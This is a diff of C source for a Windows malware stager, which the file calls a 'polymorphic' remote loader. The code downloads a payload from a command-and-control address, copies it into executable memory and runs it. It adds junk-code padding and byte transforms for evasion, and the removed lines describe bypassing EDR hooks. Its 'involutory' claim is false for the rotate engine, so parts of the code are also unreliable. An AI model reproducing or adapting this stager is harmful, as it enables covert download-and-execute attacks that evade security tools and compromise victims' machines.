@@ -1,88 +1,99 @@
-// mk-2-polymorph_remote.c — Remote Polymorphic Stager (Native API + Direct Syscalls)
-// Compile: cl mk-2-polymorph_remote.c /O2 /link user32.lib wininet.lib
+// Compile: cl mk1-remote.c /O2 /link wininet.lib user32.lib
 
 #include <windows.h>
 #include <wininet.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <time.h>
+#include <intrin.h>
 
 #pragma comment(lib, "wininet.lib")
 
 typedef void(*ENGINE)(BYTE*, DWORD, BYTE);
 
-// Direct syscall stubs (SysWhispers3-style — beats most EDR hooks)
-DWORD64 __syscall(const char* name, ...);
+// Heavy junk 
+static void junk() {
+    volatile DWORD a = 0xDEADBEEF;
+    a ^= (DWORD)GetTickCount64();
+    a = _rotl(a, 13);
+    a += 0x11111111;
+    Sleep(0);
+    volatile BYTE b = 0xAA; b = ~b; b = _rotl8(b, 3);
+}
+#define JUNK do { for(int i=0; i<10+rand()%20; i++) junk(); } while(0)
 
-// Native API prototypes
-typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
-    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
-    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
-    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
-    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
-
-// 5 polymorphic engines (same as before)
-static void eng_xor(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]^=k; }
-static void eng_add(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
-static void eng_rol(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
-static void eng_rev(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s/2;i++) { BYTE t=p[i]; p[i]=p[s-1-i]; p[s-1-i]=t; } }
-static void eng_not(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]=~p[i]; }
+// 5 involutory polymorphic engines
+static void eng_xor(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]^=k; }
+static void eng_add(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
+static void eng_rol(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
+static void eng_rev(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s/2;i++) { BYTE t=p[i]; p[i]=p[s-1-i]; p[s-1-i]=t; } }
+static void eng_not(BYTE* p, DWORD s, BYTE k) { for(DWORD i=0;i<s;i++) p[i]=~p[i]; }
 
 ENGINE engines[] = { eng_xor, eng_add, eng_rol, eng_rev, eng_not };
 const int NUM = 5;
 
 int main() {
-    srand(GetTickCount());
+    // entropy
+    ULARGE_INTEGER qpc; QueryPerformanceCounter((PLARGE_INTEGER)&qpc);
+    unsigned long long tsc = __rdtsc();
+    unsigned int seed = (unsigned int)(GetTickCount64() ^ qpc.LowPart ^ qpc.HighPart ^ tsc ^ (uintptr_t)&seed);
+    srand(seed);
 
-    // === CONFIG: CHANGE THIS URL ===
-    const char* url = "http://SERVER_IP/payload-64.bin";  // ← your C2
+    // CHANGE THIS URL TO YOUR SERVER
+    const char* url = "http://192.168.1.100:8080/payload-64.bin";  // Your C2
 
-    HINTERNET hInt = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    HINTERNET hConn = InternetOpenUrlA(hInt, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hConn) return 1;
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) return 1;
 
-    BYTE* payload = NULL;
-    DWORD size = 0, read = 0;
-    BYTE buf[4096];
-
-    while (InternetReadFile(hConn, buf, sizeof(buf), &read) && read) {
-        payload = realloc(payload, size + read);
-        memcpy(payload + size, buf, read);
-        size += read;
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return 1;
     }
-    InternetCloseHandle(hConn);
-    InternetCloseHandle(hInt);
 
-    if (!payload || size < 100) return 1;
+    // Download entire payload into memory
+    BYTE* payload = NULL;
+    DWORD totalSize = 0;
+    BYTE buffer[8192];
+    DWORD bytesRead;
 
-    // Allocate RX memory via direct syscall
-    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
-    PVOID base = NULL;
-    SIZE_T allocSize = size;
-    NtAlloc((HANDLE)-1, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
+        payload = realloc(payload, totalSize + bytesRead);
+        memcpy(payload + totalSize, buffer, bytesRead);
+        totalSize += bytesRead;
+    }
 
-    // Write + decrypt
-    memcpy(base, payload, size);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    if (!payload || totalSize < 100) {
+        printf("[-] Failed to download payload\n");
+        if (payload) free(payload);
+        return 1;
+    }
+
+    // Allocate RX memory
+    BYTE* exec = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec) {
+        free(payload); return 1;
+    }
+    memcpy(exec, payload, totalSize);
     free(payload);
 
-    int e = rand() % NUM;
-    BYTE k = (BYTE)rand();
-    engines[e](base, size, k);
-    engines[e](base, size, k);
+    // Polymorph it
+    int engine = rand() % NUM;
+    BYTE key = (BYTE)rand();
 
-    // Change to RX via direct syscall
-    pNtProtectVirtualMemory NtProtect = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
-    ULONG old;
-    NtProtect((HANDLE)-1, &base, &allocSize, PAGE_EXECUTE_READ, &old);
+    printf("[+] MK-1 REMOTE — Engine #%d/5 (key 0x%02X) — %d bytes\n", engine+1, key, totalSize);
 
-    // Execute via direct syscall
-    pNtCreateThreadEx NtCreateThread = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
-    HANDLE hThread;
-    NtCreateThread(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, base, NULL, FALSE, 0, 0, 0, NULL);
-    WaitForSingleObject(hThread, INFINITE);
+    JUNK;
+    engines[engine](exec, totalSize, key);
+    engines[engine](exec, totalSize, key);
+    JUNK;
 
+    printf("[+] Executing remote payload...\n");
+    FlushInstructionCache(GetCurrentProcess(), exec, totalSize);
+    ((void(*)())exec)();
+
+    VirtualFree(exec, 0, MEM_RELEASE);
     return 0;
 }
